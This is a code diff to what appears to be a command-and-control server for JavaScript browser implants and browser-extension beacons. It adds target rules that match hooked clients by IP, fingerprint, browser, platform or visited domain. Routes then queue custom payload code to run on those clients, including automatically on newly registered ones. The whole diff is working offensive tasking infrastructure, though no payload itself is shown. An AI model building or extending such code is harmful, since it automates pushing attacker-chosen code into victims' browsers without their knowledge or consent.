@@ -650,6 +650,20 @@ class ClientPayloadJob(Base):
 
 
 
+class PayloadTargetRule(Base):
+    __tablename__ = 'payloadtargetrules'
+
+    id          = Column(Integer, primary_key=True)
+    payloadKey  = Column(Integer, nullable=False)
+    filterQuery = Column(String(500), nullable=False)
+    active      = Column(Boolean, nullable=False, default=False)
+    repeatrun   = Column(Boolean, nullable=False, default=False)
+
+    def __repr__(self):
+        return f'<PayloadTargetRule {self.id}>'
+
+
+
 class BlockedIP(Base):
     __tablename__ = 'blockedips'
 
@@ -716,22 +730,89 @@ def scheduleRepeatTasks(client):
     # get client scheduled payload
     clientPayloads = ClientPayloadJob.query.filter_by(clientKey=client.id)
 
+    # Build set of payload IDs already scheduled for this client
+    scheduledPayloadIds = set(cp.payloadKey for cp in clientPayloads)
 
     for payload in payloads:
-        alreadyScheduled = False
- 
-        for clientPayload in clientPayloads:
-            if clientPayload.payloadKey == payload.id:
-                # already scheduled!
-                alreadyScheduled = True
-                break
-        
-        if not alreadyScheduled:
-            newJob = ClientPayloadJob(clientKey=client.id, payloadKey = payload.id, code=payload.code, repeatrun=True)
+        if payload.id not in scheduledPayloadIds:
+            newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
             db_session.add(newJob)
-            # logger.info('********* Just added client update repeat job: ' + client.nickname + ', ' + str(payload.id))
+            scheduledPayloadIds.add(payload.id)
             dbCommit()
 
+    # Check target rules with repeat enabled
+    targetRules = PayloadTargetRule.query.filter_by(active=True, repeatrun=True).all()
+    for rule in targetRules:
+        if rule.payloadKey in scheduledPayloadIds:
+            continue
+        if clientMatchesFilter(client, rule.filterQuery):
+            payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
+            if payload:
+                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
+                db_session.add(newJob)
+                scheduledPayloadIds.add(payload.id)
+                dbCommit()
+
+
+
+
+def clientMatchesFilter(client, filterQuery):
+    """Check if a client matches a filter query string.
+    Mirrors the JS filterClients() logic: split on &&, support ! negation,
+    case-insensitive substring match, all terms must pass (AND logic).
+    """
+    filterQuery = filterQuery.strip()
+    if not filterQuery:
+        return False
+
+    # Build haystack from client fields (mirrors JS filterClients)
+    display_domain = client.domain
+    if not display_domain and client.clientType != 'bex-beacon':
+        latest_url = UrlVisited.query.filter_by(clientID=client.uuid).order_by(UrlVisited.timeStamp.desc()).first()
+        if latest_url:
+            from urllib.parse import urlparse
+            parsed = urlparse(latest_url.url)
+            display_domain = parsed.hostname
+
+    haystack = ' '.join([
+        client.tag or '',
+        client.nickname or '',
+        client.ipAddress or '',
+        client.fingerprint or '',
+        client.platform or '',
+        client.browser or '',
+        client.clientType or '',
+        display_domain or '',
+        client.uuid or ''
+    ]).lower()
+
+    # Parse terms: split on &&, each can be negated with leading !
+    raw_terms = filterQuery.split('&&')
+    terms = []
+    for t in raw_terms:
+        t = t.strip().lower()
+        if not t:
+            continue
+        negate = False
+        if t.startswith('!'):
+            negate = True
+            t = t[1:].strip()
+        if t:
+            terms.append({'term': t, 'negate': negate})
+
+    if not terms:
+        return False
+
+    for term_obj in terms:
+        found = term_obj['term'] in haystack
+        if term_obj['negate']:
+            if found:
+                return False
+        else:
+            if not found:
+                return False
+
+    return True
 
 
 
@@ -1373,9 +1454,23 @@ def returnUUID(tag='', clientType='js-implant'):
     payloads = CustomPayload.query.filter_by(autorun=True)
     client   = Client.query.filter_by(uuid=token).first()
 
+    scheduledPayloadIds = set()
     for payload in payloads:
         newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
         db_session.add(newJob)
+        scheduledPayloadIds.add(payload.id)
+
+    # Add target rule repeat payloads for this new client
+    targetRules = PayloadTargetRule.query.filter_by(active=True, repeatrun=True).all()
+    for rule in targetRules:
+        if rule.payloadKey in scheduledPayloadIds:
+            continue
+        if clientMatchesFilter(client, rule.filterQuery):
+            payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
+            if payload:
+                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code, repeatrun=True)
+                db_session.add(newJob)
+                scheduledPayloadIds.add(payload.id)
 
     dbCommit()
 
@@ -3638,17 +3733,179 @@ def clearAllPayloadJobs():
     CustomPayloads = CustomPayload.query.filter_by(autorun=True)
 
     for payload in CustomPayloads:
-        payload.autorun=False 
+        payload.autorun=False
 
     CustomPayloads = CustomPayload.query.filter_by(repeatrun=True)
 
     for payload in CustomPayloads:
-        payload.repeatrun=False 
+        payload.repeatrun=False
+
+    # Disable all target rule autorun and repeat flags
+    targetRules = PayloadTargetRule.query.filter_by(active=True).all()
+    for rule in targetRules:
+        rule.active = False
+    targetRules = PayloadTargetRule.query.filter_by(repeatrun=True).all()
+    for rule in targetRules:
+        rule.repeatrun = False
 
     dbCommit()
 
     return "ok", 200
    
+
+
+@app.route('/api/payload/targetRule/preview', methods=['POST'])
+@login_required
+def previewTargetRule():
+    content = request.json
+    filterQuery = content.get('filterQuery', '').strip()
+    if not filterQuery:
+        return jsonify({'matched': 0, 'clients': []}), 200
+
+    clients = Client.query.filter_by(sessionValid=True).all()
+    matched = []
+
+    for client in clients:
+        if clientMatchesFilter(client, filterQuery):
+            matched.append({
+                'nickname': client.nickname or client.uuid[:8],
+                'ip': client.ipAddress or '',
+                'platform': client.platform or '',
+                'browser': client.browser or ''
+            })
+            if len(matched) >= 50:
+                break
+
+    return jsonify({'matched': len(matched), 'clients': matched}), 200
+
+
+
+@app.route('/api/payload/<int:payloadId>/targetRules', methods=['GET'])
+@login_required
+def getTargetRules(payloadId):
+    rules = PayloadTargetRule.query.filter_by(payloadKey=payloadId).all()
+    result = []
+    for r in rules:
+        result.append({
+            'id': r.id,
+            'payloadKey': r.payloadKey,
+            'filterQuery': r.filterQuery,
+            'active': r.active,
+            'repeatrun': r.repeatrun
+        })
+    return jsonify(result)
+
+
+
+@app.route('/api/payload/<int:payloadId>/targetRule', methods=['POST'])
+@login_required
+def addTargetRule(payloadId):
+    content = request.json
+    filterQuery = content.get('filterQuery', '').strip()
+    if not filterQuery:
+        return "Filter query required", 400
+
+    payload = CustomPayload.query.filter_by(id=payloadId).first()
+    if not payload:
+        return "Payload not found", 404
+
+    rule = PayloadTargetRule(payloadKey=payloadId, filterQuery=filterQuery)
+    db_session.add(rule)
+    dbCommit()
+
+    return jsonify({'id': rule.id}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>/update', methods=['POST'])
+@login_required
+def updateTargetRule(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    content = request.json
+    filterQuery = content.get('filterQuery', '').strip()
+    if not filterQuery:
+        return "Filter query required", 400
+
+    rule.filterQuery = filterQuery
+    dbCommit()
+
+    return jsonify({'id': rule.id, 'filterQuery': rule.filterQuery}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>/toggle', methods=['POST'])
+@login_required
+def toggleTargetRule(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    rule.active = not rule.active
+    dbCommit()
+
+    return jsonify({'active': rule.active}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>/repeat', methods=['POST'])
+@login_required
+def toggleTargetRuleRepeat(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    rule.repeatrun = not rule.repeatrun
+    dbCommit()
+
+    return jsonify({'repeatrun': rule.repeatrun}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>/run', methods=['POST'])
+@login_required
+def runTargetRule(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
+    if not payload:
+        return "Payload not found", 404
+
+    clients = Client.query.filter_by(sessionValid=True).all()
+    matched = 0
+
+    for client in clients:
+        if clientMatchesFilter(client, rule.filterQuery):
+            # Check if client already has a job for this payload
+            existing = ClientPayloadJob.query.filter_by(clientKey=client.id, payloadKey=payload.id).first()
+            if not existing:
+                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
+                db_session.add(newJob)
+                matched += 1
+
+    if matched > 0:
+        dbCommit()
+
+    return jsonify({'matched': matched}), 200
+
+
+
+@app.route('/api/payload/targetRule/<int:ruleId>', methods=['DELETE'])
+@login_required
+def deleteTargetRule(ruleId):
+    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
+    if not rule:
+        return "Rule not found", 404
+
+    db_session.delete(rule)
+    dbCommit()
+
+    return "ok", 200
+
 
 
 @app.route('/api/savePayload', methods=['POST'])
@@ -3707,6 +3964,11 @@ def saveCustomPayloads():
 @login_required
 def deleteCustomPayload(key):
     payload = CustomPayload.query.filter_by(id=key).first()
+
+    # Cascade delete target rules and orphaned jobs for this payload
+    PayloadTargetRule.query.filter_by(payloadKey=payload.id).delete()
+    ClientPayloadJob.query.filter_by(payloadKey=payload.id).delete()
+
     db_session.delete(payload)
     dbCommit()
 
